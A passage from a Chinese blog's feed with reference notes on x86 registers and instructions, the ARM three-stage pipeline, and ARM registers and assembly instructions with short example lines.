title="IDTR"></a>IDTR</h4><p>中断描述符表寄存器，与GDTR的作用类似，IDTR寄存器用于存放中断描述符表IDT的32位线性基地址和16位表长度值。指令LIDT和SIDT分别用于加载和保存IDTR寄存器的内容。在机器刚加电或处理器复位后，基地址被默认地设置为0，而长度值被设置成0xFFFF。</p><h4 id="LDTR"><a href="#LDTR" class="headerlink" title="LDTR"></a>LDTR</h4><p>用于存放局部描述符表LDT的32位线性基地址、16位段限长和描述符属性值。指令LLDT和SLDT分别用于加载和保存LDTR寄存器的段描述符部分，包含LDT</p><h3 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h3><p>存储我们cpu要读取指令的地址</p><h3 id="TSC"><a href="#TSC" class="headerlink" title="TSC"></a>TSC</h3><p>一个用于时间戳计数器的64位的寄存器，它在每个时钟信号到来时加一</p><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><h4 id="MOV"><a href="#MOV" class="headerlink" title="MOV"></a>MOV</h4><p>mov指令将第二个操作数（可以是寄存器的内容、内存中的内容或值）复制到第一个操作数（寄存器或内存）。mov不能用于直接从内存复制到内存</p><h4 id="push"><a href="#push" class="headerlink" title="push"></a>push</h4><p>push指令将操作数压入内存的栈中</p><h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a><strong>pop</strong></h4><p>与push相反，将操作数从栈中取出</p><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a><strong>lea</strong></h4><p> lea实际上是一个载入有效地址指令，将第二个操作数表示的地址载入到第一个操作数（寄存器）中 lea实际上是一个载入有效地址指令，将第二个操作数表示的地址载入到第一个操作数（寄存器）中。</p><h3 id="算术和逻辑指令"><a href="#算术和逻辑指令" class="headerlink" title="算术和逻辑指令"></a>算术和逻辑指令</h3><h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>将两个操作数相加，且将相加后的结果保存到第一个操作数中。</p><h4 id="SUB"><a href="#SUB" class="headerlink" title="SUB"></a>SUB</h4><p>第一个操作数减去第二个操作数，并将相减后的值保存在第一个操作数。</p><h4 id="INC和DEC"><a href="#INC和DEC" class="headerlink" title="INC和DEC"></a>INC和DEC</h4><p>inc,dec分别表示将操作数自加1，自减1。</p><h4 id="IMUL"><a href="#IMUL" class="headerlink" title="IMUL"></a>IMUL</h4><p>整数相乘指令，它有两种指令格式，一种为两个操作数，将两个操作数的值相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器；第二种格式为三个操作数，其语义为：将第二个和第三个操作数相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器</p><h4 id="IDIV"><a href="#IDIV" class="headerlink" title="IDIV"></a>IDIV</h4><p>idiv指令完成整数除法操作，idiv只有一个操作数，此操作数为除数，而被除数则为EDX:EAX中的内容（一个64位的整数）。</p><h4 id="AND-OR-XOR"><a href="#AND-OR-XOR" class="headerlink" title="AND, OR, XOR"></a>AND, OR, XOR</h4><p>逻辑与、逻辑或、逻辑异或操作指令，用于操作数的位操作，操作结果放在第一个操作数中。</p><h4 id="NOT"><a href="#NOT" class="headerlink" title="NOT"></a>NOT</h4><p>位翻转指令，将操作数中的每一位翻转，即0-&gt;1, 1-&gt;0。</p><h4 id="NEG"><a href="#NEG" class="headerlink" title="NEG"></a>NEG</h4><p>取负指令。</p><h4 id="SHL-SHR"><a href="#SHL-SHR" class="headerlink" title="SHL, SHR"></a>SHL, SHR</h4><p>位移指令，有两个操作数，第一个操作数表示被操作数，第二个操作数指示位移的数量。</p><h3 id="控制转移指令"><a href="#控制转移指令" class="headerlink" title="控制转移指令"></a>控制转移指令</h3><h4 id="JMP"><a href="#JMP" class="headerlink" title="JMP"></a>JMP</h4><p>控制转移到label所指示的地址。</p><h4 id="jcondition"><a href="#jcondition" class="headerlink" title="jcondition"></a>jcondition</h4><p>条件转移指令，条件转移指令依据机器状态字中的一些列条件状态转移。机器状态字中包括指示最后一个算数运算结果是否为0，运算结果是否为负数等。</p><blockquote><p>je <label> (jump when equal)<br>jne <label> (jump when not equal)<br>jz <label> (jump when last result was zero)<br>jg <label> (jump when greater than)<br>jge <label> (jump when greater than or equal to)<br>jl <label> (jump when less than)<br>jle <label>(jump when less than or equal to)</p></blockquote><h4 id="CMP"><a href="#CMP" class="headerlink" title="CMP"></a>CMP</h4><p>cmp指令比较两个操作数的值，并根据比较结果设置机器状态字中的条件码。此指令与sub指令类似，但是cmp不用将计算结果保存在操作数中。</p><h4 id="CALL-RET"><a href="#CALL-RET" class="headerlink" title="CALL, RET"></a>CALL, RET</h4><p>这两条指令实现子程序（过程、函数等意思）的调用及返回。call指令首先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令。与其它简单的跳转指令不同，call指令保存调用之前的地址信息（当call指令结束后，返回到调用之前的地址）。</p><p>ret指令实现子程序的返回机制，ret指令弹出栈中保存的指令地址，然后无条件转移到保存的指令地址执行。</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>三级流水线</title>
    <link href="/article/f5705223.html"/>
    <url>/article/f5705223.html</url>
    
    <content type="html"><![CDATA[<p>一般处理器执行代码程序为，读一条，执行一条</p><p>而流水线则使用三个阶段处理：</p><p>取指，从储存器中取出指令</p><p>译码，识别指令</p><p>执行，处理指令，并将结果放回寄存器</p><p>arm可以在执行第一条指令的时候，对第二条指令进行译码，并且取出第三条指令</p><p>但是！</p><p>无论处理器处于何种状态，程序计数器R15(PC)总是指向“正在取指”的指令，而不是指向“正在执行”的指令或者正在“译码”的指令</p><p>人们常以正在执行的指令做第一条参考，所以pc总是指向第三条指令，或者说是指向正在执行的指令地址再加两条指令地址</p><p>处理器处于ARM状态时，每条指令为4个字节，所以PC值为正在执行的指令地址加8字节，即是：</p><p>PC值 &#x3D; 当前程序执行位置 + 8字节</p><p>处理器处于Thumb状态时，每条指令为2字节，所以PC值为正在执行的指令地址加4字节，即是：</p><p>PC值 &#x3D; 当前程序执行位置 + 4字节</p>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ARM寄存器及其汇编指令</title>
    <link href="/article/c21195a7.html"/>
    <url>/article/c21195a7.html</url>
    
    <content type="html"><![CDATA[<h2 id="ARM处理器"><a href="#ARM处理器" class="headerlink" title="ARM处理器"></a>ARM处理器</h2><p>第一款RISC（精简指令集）微处理器，（arm）32位设计，但配有16位指令集（thumb）</p><p>32位和16位可以相互调用，且开销几乎为0</p><p>使用大量寄存器，功耗低，效率高</p><p>ps：具体发展，系列之类请参考百度百科：<a href="https://baike.baidu.com/item/arm/5907">https://baike.baidu.com/item/arm/5907</a></p><h2 id="arm寄存器"><a href="#arm寄存器" class="headerlink" title="arm寄存器"></a>arm寄存器</h2><p>arm包括37个寄存器，都是32位</p><p>31个通用寄存器，6个状态寄存器</p><p>arm有7种处理器模式，每个模式中有一组相应的寄存器</p><p>在任何一种处理器模式下可见的寄存器包括15个通用寄存器（r0-r14），一个或者两个状态寄存器，程序技术器（pc）</p><p>所有寄存器中，有些是各模式公用的物理寄存器，有些是某个模式独立拥有的物理寄存器</p><blockquote><p> 七个处理器模式： 用户模式（User），快速中断模式（FIQ），普通中断模式（IRQ），管理模式（Svc），数据访问中止模</p><p>（Abort），未定义指令中止模式（Und），系统模式（Sys）</p></blockquote><h3 id="寄存器用途"><a href="#寄存器用途" class="headerlink" title="寄存器用途"></a>寄存器用途</h3><p>r0 - r3：传参</p><p>r4 - r11：保存局部变量，但在thumb（16位程序）中，通常只能用r4-r7来保存局部变量</p><p>r12：ip寄存器 </p><p>r13：栈帧，即sp</p><p>r14：lr，被称为连接寄存器，用于保存子程序以及中断的返回地址</p><p>r15：程序计数器，即pc，但由于arm使用的是三级流水线结构，所以我们读取正确的pc的值之后应该在该值基础上加八个字节，即指向pc下两条指令的地址</p><blockquote><p>ps：关于三级流水线，另一片相关文章会具体解释</p></blockquote><p>CPSR：当前程序状态寄存器，在任何模式下可以被访问。包含条件标志位、中断禁止位、当前处理器模式标志以及其他的一些控制和状态位。CPSR在用户编程时由于存储条件码。</p><p>SPSR：每一种模式下都有一个状态寄存器SPSR，用于保存CPSR的状态，以便异常返回后恢复异常发生时的工作状态。用户模式和系统模式不是异常状态，所以没有SPSR，在这两种模式下访问SPSR，将产生不可预知的后果。</p><h3 id="CPSR详解："><a href="#CPSR详解：" class="headerlink" title="CPSR详解："></a>CPSR详解：</h3><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140909199.png" alt="image-20220402140909199"></p><blockquote><p>ps：长度为32</p></blockquote><p>cpsr包括条件标志位、中断禁止位、当前处理器模式标志以及其他的一些控制和状态位</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140916144.png" alt="image-20220402140916144"></p><p>通过上图就可以理解cpsr_cxsf的意思了</p><h4 id="条件码标志"><a href="#条件码标志" class="headerlink" title="条件码标志"></a>条件码标志</h4><p>N：结果是有符号的二进制补码情况下，结果为负的话N&#x3D;1，结果为非负的话N&#x3D;0</p><p>Z：结果如果为零的话Z&#x3D;1，结果非零的话Z&#x3D;0</p><p>C：有多种情况</p><blockquote><p>对于加法指令（包括比较指令CMN），产生进位的话C&#x3D;1，否则C&#x3D;0。</p><p>对于减法指令（包括比较指令CMP），如果产生借位，则C&#x3D;0;否则C&#x3D;1。</p><p>对于有移位操作的非法指令，C为移位操作中最后移出位的值。</p><p>对于其他指令，C通常不变。</p><p>ps：比较指令CMN与CMP其实才是算数指令，之后会有详解</p></blockquote><p>V：对于加减法指令，在操作数和结果是有符号的整数时，如果发生溢出，则V&#x3D;1；如果无溢出发生，则V&#x3D;0；对于其他指令，V通常不发生变化</p><h2 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h2><h3 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h3><blockquote><p> <opcode>    {<cond>}    {S}    <Rd>    ,    <Rn>    {,<opcode2>}</p></blockquote><p><code>&lt;&gt;</code>内是必须项，<code>&#123;&#125;</code>内是可选项，<code>不写</code>代表无条件执行</p><p>opcode    指令助记符，如LDR，STR 等</p><p>cond    执行条件，如EQ，NE 等</p><p>S    是否影响CPSR 寄存器的值，书写时影响CPSR，否则不影响</p><p>Rd    目标寄存器</p><p>Rn    第一个操作数的寄存器</p><p>operand2    第二个操作数</p><h3 id="储存器访问指令"><a href="#储存器访问指令" class="headerlink" title="储存器访问指令"></a>储存器访问指令</h3><p>ARM 处理是加载&#x2F;存储体系结构的典型的RISC处理器</p><p>对存储器的访问只能使用加载和存储指令实现</p><p>ARM 的加载&#x2F;存储指令是可以实现字、半字、无符&#x2F;有符字节操作</p><p>批量加载&#x2F;存储指令可实现一条指令加载&#x2F;存储多个寄存器的内容</p><p>SWP指令是一条寄存器和存储器内容交换的指令，可用于信号量操作等</p><p>ARM 处理器是冯.诺依曼存储结构，程序空间、RAM 空间及IO 映射空间统一编址，除对对RAM 操作以外，对外围IO、程序数据的访问均要通过加载&#x2F;存储指令进行</p><p>下图给出ARM存储访问指令表</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140923882.png" alt="image-20220402140923882"></p><h4 id="LDR-x2F-STR"><a href="#LDR-x2F-STR" class="headerlink" title="LDR&#x2F;STR"></a>LDR&#x2F;STR</h4><blockquote><p>LDR{cond}{T} Rd,&lt;地址&gt;;</p></blockquote><blockquote><p>STR{cond}{T} Rd,&lt;地址&gt;;</p></blockquote><p>LDR从内存中读取数据放入寄存器，STR用于将寄存器内的数据放到内存</p><blockquote><p>LDR    R2, [R7,#0x10+var_C]     将<code>R7 + 0x10+var_C</code>地址的数据放到R2</p><p>STR    R3, [R7,#0x10+var_4]     将R3的数据储存在<code>R7 + 0x10+var_4</code></p></blockquote><p>{T}为可选项，若指令有T，那么即使处理器是在特权模式下，存储系统也将访问看成是处理器是在用户模式下</p><p>T在用户模式下无效，不能与前索引偏移一起使用T</p><blockquote><p>LDR    Rd,[Rn]    零偏移，将Rn的值作为内存地址</p><p>LDR    Rd,[Rn,#0x04]! 前索引偏移，将Rn+0x04地址的值放到Rd，并且<code>更新Rn</code>的值为Rn &#x3D; Rn + 0x04，如果没有后边感叹号，则Rn不更新</p><p>LDR    Rd,label ;  程序相对偏移，label 为程序标号，label 必须是在当前指令的±4KB范围内</p><p>LDR    Rd,[Rn],#0x04 后索引偏移，将Rn中的地址的数据加载到Rd中，然后将Rn更新Rn &#x3D; Rn + 0x04</p></blockquote><p>ps：前索引偏移就是在索引前偏移，看有无！决定时候更新寄存器的内容。后索引偏移就是在索引后偏移，索引时并不偏移，索引后更新寄存器内容</p><h4 id="LDM-x2F-STM"><a href="#LDM-x2F-STM" class="headerlink" title="LDM&#x2F;STM"></a><strong>LDM&#x2F;STM</strong></h4><blockquote><p>LDM{cond}&lt;模式&gt; Rn{!},reglist{^}</p><p>STM{cond}&lt;模式&gt; Rn{!},reglist{^}</p></blockquote><p>LDM 加载多个寄存器，STM储存多个寄存器</p><p>主要用途是现场保护、数据复制、参数传送等</p><p>其模式有8种，如下所列：(前面4 种用于数据块的传输，后面4 种是堆栈操作)</p><blockquote><p>(1) IA：每次传送后地址加4</p><p>(2) IB：每次传送前地址加4</p><p>(3) DA：每次传送后地址减4</p><p>(4) DB：每次传送前地址减4</p><p>(5) FD：满递减堆栈</p><p>(6) ED：空递增堆栈</p><p>(7) FA：满递增堆栈</p><p>(8) EA：空递增堆栈</p></blockquote><p>寄存器Rn为基址寄存器，装有传送数据的初始地址，Rn 不允许为R15；缀<code>!</code>表示最后的地址写回到Rn中</p><p>寄存器列表reglist 可包含多于一个寄存器或寄存器范围，使用“,”分开，如{R1,R2,R6-R9}，寄存器排列由小到大排列</p><p><code>^</code>后缀不允许在用户模式呈系统模式下使用，若在LDM 指令用寄存器列表中包含有PC 时使用，那么除了正常的多寄存器传送外，将SPSR 拷贝到CPSR 中，这可用于异常处理返回</p><p>使用<code>^</code>后缀进行数据传送且寄存器列表不包含PC时，加载&#x2F;存储的是用户模式的寄存器，而不是当前模式的寄存器</p><blockquote><p>LDMIA    R0!,{R3-R9} ;加载R0 指向的地址上的多字数据，保存到R3～R9中，R0 值更新</p><p>STMIA    R1!,{R3-R9} ;将R3～R9 的数据存储到R1 指向的地址上，R1值更新</p><p>STMFD    SP!,{R0-R7,LR} ;现场保存，将R0～R7、LR入栈</p><p>LDMFD SP!,{R0-R7,PC}^;恢复现场，异常处理返回</p></blockquote><h4 id="SWP-寄存器和存储器交换指令"><a href="#SWP-寄存器和存储器交换指令" class="headerlink" title="SWP 寄存器和存储器交换指令"></a>SWP 寄存器和存储器交换指令</h4><blockquote><p> SWP{cond}{B} Rd,Rm,[Rn]</p></blockquote><p>SWP指令用于将一个内存单元（该单元地址放在寄存器Rn中）的内容读取到一个寄存器Rd中，同时将另一个寄存器Rm 的内容写入到该内存单元中</p><p>B 为可选后缀，若有B，则交换字节，否则交换32 位字：Rd 为数据从存储器加载到的寄存器;Rm的数据用于存储到存储器中，若Rm 与Rn 相同，则为寄存器与存储器内容进行交换;Rn 为要进行数据交换的存储器地址，Rn 不能与Rd 和Rm 相同</p><blockquote><p>SWP R1,R1,[R0] ; 将R1 的内容与R0 指向的存储单元的内容进行交换</p><p>SWP R1,R2,,[R0] ; 将R0 指向的存储单元内容读取一字节数据到R1中(高24 位清零) ; 并将R2 的内容写入到该内存单元中(最低字节有效)</p></blockquote><h3 id="ARM-数据处理指令"><a href="#ARM-数据处理指令" class="headerlink" title="ARM 数据处理指令"></a>ARM 数据处理指令</h3><h4 id="MOV-数据传送指令"><a href="#MOV-数据传送指令" class="headerlink" title="MOV 数据传送指令"></a>MOV 数据传送指令</h4><blockquote><p>MOV{cond}{S} Rd,operand2</p></blockquote><p>将8 位立即数或寄存器(operant2)传送到目标寄存器Rd，可用于移位运算等操作</p><blockquote><p>MOV R1#0x10 ;R1&#x3D;0x10</p><p>MOV R0,R1 ;R0&#x3D;R1</p><p>MOVS R3,R1,LSL #2 ;R3&#x3D;R1＜＜2，并影响标志位</p><p>MOV PC,LR  ;PC&#x3D;LR ，子程序返回</p></blockquote><h4 id="MVN-数据非传送指令"><a href="#MVN-数据非传送指令" class="headerlink" title="MVN 数据非传送指令"></a>MVN 数据非传送指令</h4><blockquote><p>MVN{cond}{S} Rd,operand2</p></blockquote><p>将8 位图立即数或寄存器(operand2)按位取反后传送到目标寄存器(Rd)，因为其具有取反功能，所以可以装载范围更广的立即数</p><blockquote><p>MVN R1,#0xFF ;R1&#x3D;0xFFFFFF00</p><p>MVN R1,R2 ;将R2 取反，结果存到R1</p></blockquote><h4 id="ADD-加法运算指令"><a href="#ADD-加法运算指令" class="headerlink" title="ADD 加法运算指令"></a>ADD 加法运算指令</h4><blockquote><p>ADD{cond}{S} Rd,Rn,operand2</p></blockquote><p> 将operand2 数据与Rn 的值相加，结果保存到Rd 寄存器</p><blockquote><p>ADDS R1,R1,#1 ;R1&#x3D;R1+1</p><p>ADD R1,R1,R2 ;R1&#x3D;R1+R2</p><p>ADDS R3,R1,R2,LSL #2 ;R3&#x3D;R1+R2＜＜2</p></blockquote><h4 id="SUB-减法运算指令"><a href="#SUB-减法运算指令" class="headerlink" title="SUB 减法运算指令"></a>SUB 减法运算指令</h4><blockquote><p>SUB{cond}{S} Rd,Rn,operand2</p></blockquote><p>用寄存器Rn 减去operand2。结果保存到Rd 中</p><blockquote><p>SUBS R0,R0,#1 ;R0&#x3D;R0-1</p><p>SUBS R2,R1,R2 ;R2&#x3D;R1-R2</p><p>SUB R6,R7,#0x10 ;R6&#x3D;R7-0x10</p></blockquote><h4 id="RSB-逆向减法指令"><a href="#RSB-逆向减法指令" class="headerlink" title="RSB 逆向减法指令"></a>RSB 逆向减法指令</h4><blockquote><p>RSB{cond}{S} Rd,Rn,operand2</p></blockquote><p>用寄存器operand2 减法Rn，结果保存到Rd 中</p><blockquote><p>RSB R3,R1,#0xFF00 ;R3&#x3D;0xFF00-R1</p><p>RSBS R1,R2,R2,LSL #2 ;R1&#x3D;R2＜＜2-R2&#x3D;R2×3</p><p>RSB R0,R1,#0 ;R0&#x3D;-R1</p></blockquote><h4 id="ADC-带进位加法指令"><a href="#ADC-带进位加法指令" class="headerlink" title="ADC 带进位加法指令"></a><strong>ADC</strong> 带进位加法指令</h4><blockquote><p>ADC{cond}{S} Rd,Rn,operand2</p></blockquote><p>将operand2 的数据与Rn 的值相加，再加上CPSR中的C 条件标志位，结果保存到Rd 寄存器</p><blockquote><p>ADC R1,R1,R3 ;使用ADC 实现64 位加法，R1&#x3D;R1+R3</p></blockquote><h4 id="SBC-带进位减法指令"><a href="#SBC-带进位减法指令" class="headerlink" title="SBC 带进位减法指令"></a><strong>SBC</strong> 带进位减法指令</h4><blockquote><p>SCB{cond}{S}Rd,Rn,operand2</p></blockquote><p>用寄存器Rn 减去operand2，再减去CPSR 中的C条件标志位的非（即若C 标志清零，则结果减去1），结果保存到Rd 中</p><blockquote><p>SBC R1,R1,R3 ;使用SBC 实现64 位减法，R1 &#x3D; R1 - R3</p></blockquote><h4 id="RSC-带进位逆向减法指令"><a href="#RSC-带进位逆向减法指令" class="headerlink" title="RSC 带进位逆向减法指令"></a><strong>RSC</strong> 带进位逆向减法指令</h4><blockquote><p> RSC{cond}{S} Rd,Rn,operand2</p></blockquote><p>用寄存器operand2 减去Rn，再减去CPSR 中的C条件标志位，结果保存到Rd 中</p><blockquote><p>RSC R3,R1,#0 ;使用RSC 指令实现求64 位数值的负数 R3 &#x3D; 0 -R1</p></blockquote><h4 id="AND-逻辑与操作指令"><a href="#AND-逻辑与操作指令" class="headerlink" title="**AND **逻辑与操作指令"></a>**AND **逻辑与操作指令</h4><blockquote><p>AND{cond}{S} Rd,Rn,operand2</p></blockquote><p>将operand2 值与寄存器Rn 的值按位作逻辑与操作，结果保存到Rd中</p><p><code>逻辑与操作，都为1则返回1</code></p><blockquote><p>ANDS R0,R0,#x01 ;R0&#x3D;R0&amp;0x01，取出最低位数据</p><p>AND R2,R1,R3 ;R2&#x3D;R1&amp;R3</p></blockquote><h4 id="ORR-逻辑或操作指令"><a href="#ORR-逻辑或操作指令" class="headerlink" title="**ORR **逻辑或操作指令"></a>**ORR **逻辑或操作指令</h4><blockquote><p>ORR{cond}{S} Rd,Rn,operand2</p></blockquote><p>将operand2 的值与寄存器Rn的值按位作逻辑或操作，结果保存到Rd 中</p><blockquote><p>ORR R0,R0,#x0F ;将R0 的低4 位置1</p><p>MOV R1,R2,LSR #4</p><p>ORR R3,R1,R3,LSL #8 ;使用ORR 指令将近R2 的高8位数据移入到R3 低8 位中</p></blockquote><h4 id="EOR-逻辑异或操作指令"><a href="#EOR-逻辑异或操作指令" class="headerlink" title="**EOR **逻辑异或操作指令"></a>**EOR **逻辑异或操作指令</h4><blockquote><p>EOR{cond}{S}Rd,Rn,operand2</p></blockquote><p>将operand2 的值与寄存器Rn 的值按位作逻辑异或操作，结果保存到Rd中</p><blockquote><p>EOR R1,R1,#0x0F ;将R1 的低4 位取反</p><p>EOR R2,R1,R0 ;R2&#x3D;R1^R0</p><p>EORS R0,R5,#0x01 ;将R5 和0x01 进行逻辑异或，结果保存到R0，并影响标志位</p></blockquote><h4 id="BIC-位清除指令"><a href="#BIC-位清除指令" class="headerlink" title="BIC 位清除指令"></a><strong>BIC</strong> 位清除指令</h4><blockquote><p> BIC{cond}{S}Rd,Rn,operand2</p></blockquote><p>将寄存器Rn 的值与operand2 的值的反码按位作逻辑与操作，结果保存到Rd中。</p><blockquote><p>BIC R1,R1,#0x0F ;将R1 的低4 位清零，其它位不变</p><p>BIC R1,R2,R3 ;将拭的反码和R2 相逻辑与，结果保存到R1</p></blockquote><h4 id="CMP-比较指令"><a href="#CMP-比较指令" class="headerlink" title="CMP 比较指令"></a><strong>CMP</strong> 比较指令</h4><blockquote><p>CMP{cond} Rn,operand2</p></blockquote><p>指令使用寄存器Rn 的值减去operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行</p><p>CMP 指令不保存运算结果</p><blockquote><p>CMP R1,#10 ;R1 与10 比较，设置相关标志位</p><p>CMP R1,R2 ;R1 与R2 比较，设置相关标志位</p></blockquote><h4 id="CMN-负数比较指令"><a href="#CMN-负数比较指令" class="headerlink" title="**CMN **负数比较指令"></a>**CMN **负数比较指令</h4><blockquote><p>CMN{cond} Rn,operand2</p></blockquote><p>指令使用寄存器Rn 与值加上operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行</p><blockquote><p>CMN R0,#1 ;R0+1,判断R0 是否为1 的补码，若是Z 置位</p><p>CMN 指令与ADDS 指令的区别在于CMN 指令不保存运算结果。CMN指令可用于负数比较，比如CMNR0，#1 指令则表示R0 与-1 比较，若R0 为-(即1 的补码)，则Z 置位，否则Z复位。</p></blockquote><h4 id="TST-位测试指令"><a href="#TST-位测试指令" class="headerlink" title="TST 位测试指令"></a><strong>TST</strong> 位测试指令</h4><blockquote><p> TST{cond} Rn,operand2</p></blockquote><p>指令将寄存器Rn 的值与operand2 的值按位作逻辑与操作，根据操作的结果更新CPSR中相应的条件标志位(当结果为0时，EQ位被设置)，以便后面指令根据相应的条件标志来判断是否执行</p><blockquote><p>TST R0,#0x01 ;判断R0 的最低位是否为0</p><p>TST R1,#0x0F ;判断R1 的低4 位是否为0</p><p>TST 指令与ANDS 指令的区别在于TST4 指令不保存运算结果。TST指令通常于EQ、NE条件码配合使用，当所有测试位均为0 时，EQ 有效，而只要有一个测试为不为0，则NE 有效。</p></blockquote><h4 id="TEQ-相等测试指令"><a href="#TEQ-相等测试指令" class="headerlink" title="TEQ 相等测试指令"></a><strong>TEQ</strong> 相等测试指令</h4><blockquote><p> TEQ{cond} Rn,operand2</p></blockquote><p>指令寄存器Rn 的值与operand2 的值按位作逻辑异或操作，根据操作的结果更新CPSR中相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行</p><blockquote><p>TEQ R0,R1 ;比较R0 与R1 是否相等(不影响V 位和C 位)</p><p>TST 指令与EORS 指令的区别在于TST 指令不保存运算结果。使用TEQ进行相等测试，常与EQNE 条件码配合使用，当两个数据相等时，EQ 有效，否则NE 有效。</p></blockquote><h4 id="MUL-32-位乘法指令"><a href="#MUL-32-位乘法指令" class="headerlink" title="MUL 32 位乘法指令"></a><strong>MUL</strong> 32 位乘法指令</h4><blockquote><p> MUL{cond}{S} Rd,Rm,Rs</p></blockquote><p>指令将Rm 和Rs 中的值相乘，结果的低32 位保存到Rd中</p><blockquote><p>MUL R1,R2,R3 ;R1&#x3D;R2×R3</p><p>MULS R0,R3,R7 ;R0&#x3D;R3×R7，同时设置CPSR 中的N位和Z 位</p></blockquote><h4 id="MLA-32-位乘加指令"><a href="#MLA-32-位乘加指令" class="headerlink" title="MLA 32 位乘加指令"></a><strong>MLA</strong> 32 位乘加指令</h4><blockquote><p>MLA{cond}{S} Rd,Rm,Rs,Rn</p></blockquote><p> 指令将Rm 和Rs 中的值相乘，再将乘积加上第3 个操作数，结果的低32位保存到Rd 中</p><blockquote><p>MLA R1,R2,R3,R0 ;R1&#x3D;R2×R3+R0</p></blockquote><h4 id="UMULL-64-位无符号乘法指令"><a href="#UMULL-64-位无符号乘法指令" class="headerlink" title="**UMULL ** 64 位无符号乘法指令"></a>**UMULL ** 64 位无符号乘法指令</h4><blockquote><p> UMULL{cond}{S} RdLo,RdHi,Rm,Rs</p></blockquote><p>指令将Rm 和Rs 中的值作无符号数相乘，结果的低32位保存到RsLo 中，而高32 位保存到RdHi 中</p><blockquote><p>UMULL R0,R1,R5,R8 ;(R1、R0)&#x3D;R5×R8</p></blockquote><h4 id="UMLAL-64-位无符号乘加指令"><a href="#UMLAL-64-位无符号乘加指令" class="headerlink" title="UMLAL 64 位无符号乘加指令"></a><strong>UMLAL</strong> 64 位无符号乘加指令</h4><blockquote><p> UMLAL{cond}{S} RdLo,RdHi,Rm,Rs</p></blockquote><p>指令将Rm 和Rs 中的值作无符号数相乘，64 位乘积与RdHi、RdLo相加，结果的低32 位保存到RdLo 中，而高32 位保存到RdHi 中</p><blockquote><p>UMLAL R0,R1,R5,R8;(R1,R0)&#x3D;R5×R8+(R1,R0)</p></blockquote><h4 id="SMULL-64-位有符号乘法指令"><a href="#SMULL-64-位有符号乘法指令" class="headerlink" title="**SMULL **64 位有符号乘法指令"></a>**SMULL **64 位有符号乘法指令</h4><blockquote><p> SMULL{cond}{S} RdLo,RdHi,Rm,Rs</p></blockquote><p>指令将Rm 和Rs 中的值作有符号数相乘，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中</p><blockquote><p> SMULL R2,R3,R7,R6 ;(R3,R2)&#x3D;R7×R6</p></blockquote><h4 id="SMLAL-64-位有符号乘加指令"><a href="#SMLAL-64-位有符号乘加指令" class="headerlink" title="SMLAL 64 位有符号乘加指令"></a><strong>SMLAL</strong> 64 位有符号乘加指令</h4><blockquote><p> SMLAL{cond}{S} RdLo,RdHi,Rm,Rs</p></blockquote><p>指令将Rm 和Rs 中的值作有符号数相乘，64 位乘积与RdHi、RdLo，相加，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中</p><blockquote><p>SMLAL R2,R3,R7,R6;(R3,R2)&#x3D;R7×R6+(R3,R2)</p></blockquote><h3 id="ARM跳转指令"><a href="#ARM跳转指令" class="headerlink" title="ARM跳转指令"></a>ARM跳转指令</h3><h4 id="B"><a href="#B" class="headerlink" title="B"></a><strong>B</strong></h4><blockquote><p>B{cond} label</p></blockquote><p>跳转到指定的地址执行程序，跳转到指令B 限制在当前指令的±32Mb 的范围内</p><blockquote><p>B WAITA ;跳转到WAITA 标号处</p><p>B 0x1234 ;跳转到绝对地址0x1234 处</p></blockquote><h4 id="BL-带链接的跳转指令"><a href="#BL-带链接的跳转指令" class="headerlink" title="**BL **带链接的跳转指令"></a>**BL **带链接的跳转指令</h4><blockquote><p>BL{cond} label</p></blockquote><p>指令将下一条指令的地址拷贝到R14(即LR)链接寄存器中，然后跳转到指定地址运行程序</p><p>跳转指令B 限制在当前指令的±32MB 的范围内。BL 指令用于子程序调用</p><blockquote><p>BL DELAY</p></blockquote><h4 id="BX-带状态切换的跳转指令"><a href="#BX-带状态切换的跳转指令" class="headerlink" title="BX 带状态切换的跳转指令"></a><strong>BX</strong> 带状态切换的跳转指令</h4><blockquote><p> BX{cond} Rm</p></blockquote><p>跳转到Rm 指定的地址执行程序，若Rm 的位[0]为1，则跳转时自动将CPSR 中的标志T 置位，即把目标地址的代码解释为Thumb代码;若Rm 的位[0]为0，则跳转时自动将CPSR 中的标志T 复位，即把目标地址的代码解释为ARM代码</p><blockquote><p>ADRL R0,ThumbFun+1</p><p>BX R0 ;跳转到R0 指定的地址，并根据R0 的最低位来切换处理器状态</p></blockquote><h4 id="BLX"><a href="#BLX" class="headerlink" title="BLX"></a>BLX</h4><p>BLX目标地址：跳转，改变状态及保存PC值</p><h3 id="ARM-协处理器指令"><a href="#ARM-协处理器指令" class="headerlink" title="ARM 协处理器指令"></a>ARM 协处理器指令</h3><h4 id="CDP-协处理器数据操作指令"><a href="#CDP-协处理器数据操作指令" class="headerlink" title="CDP 协处理器数据操作指令"></a>CDP 协处理器数据操作指令</h4><blockquote><p>CDP{cond}coproc,opcodel,CRd,CRn,CRm{,opcode2}</p><p>coproc 指令操作的协处理器名。标准名为pn,n 为0～15。</p><p>opcodel 协处理器的特定操作码。</p><p>CRd 作为目标寄存器的协处理器寄存器。</p><p>CRN 